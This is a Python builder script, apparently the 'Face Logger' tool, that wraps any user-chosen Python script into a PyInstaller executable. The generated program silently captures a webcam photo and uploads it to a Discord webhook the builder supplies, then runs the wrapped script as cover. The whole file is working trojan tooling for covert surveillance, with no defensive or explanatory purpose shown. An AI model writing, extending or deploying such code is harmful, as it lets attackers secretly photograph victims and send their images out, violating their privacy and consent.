import os
import subprocess
import time

def create_created_py(user_script_path, webhook_url):
    with open(user_script_path, 'r') as file:
        user_script = file.read()
    
    user_script_indented = '\n    '.join(user_script.split('\n'))
    user_script_function = f"def execute_user_script():\n    {user_script_indented}\n"

    base_script = f"""
import os
import cv2
import requests
import json

def ensure_dir(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def take_photo():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Camera is not available.")
        return None
    ret, frame = cap.read()
    cap.release()
    if not ret:
        print("Error: Failed to capture photo.")
        return None
    ensure_dir('src')  
    photo_path = os.path.join('src', 'photo.jpg')
    cv2.imwrite(photo_path, frame)
    return photo_path

def send_photo(webhook_url, photo_path):
    with open(photo_path, 'rb') as f:
        files = {{'file': (os.path.basename(photo_path), f)}}
        embeds = [{{
            "title": "info",
            "description": "Face Logger",
            "color": 5814783,
            "footer": {{
                "text": "Created By Syo3333: https://github.com/syo33331/facelogger"
            }}
        }}]
        data = {{'embeds': embeds}}
        response = requests.post(webhook_url, files=files, data={{'payload_json': json.dumps(data)}})

{user_script_function}

if __name__ == '__main__':
    webhook_url = "{webhook_url}"
    photo_path = take_photo()
    if photo_path:
        send_photo(webhook_url, photo_path)
    execute_user_script()
    """
    with open('created.py', 'w') as file:
        file.write(base_script)

def build_exe():
    subprocess.run(['pyinstaller', '--onefile', 'created.py'], check=True)

def main():
    webhook_url = input("Please Enter Discord WebHook URL: ")
    user_script_path = input("Please enter the path to the Python script to include: ")
    create_created_py(user_script_path, webhook_url)
    build_exe()
    print("created.py has been converted to an executable.")
    time.sleep(5)

if __name__ == '__main__':
    main()
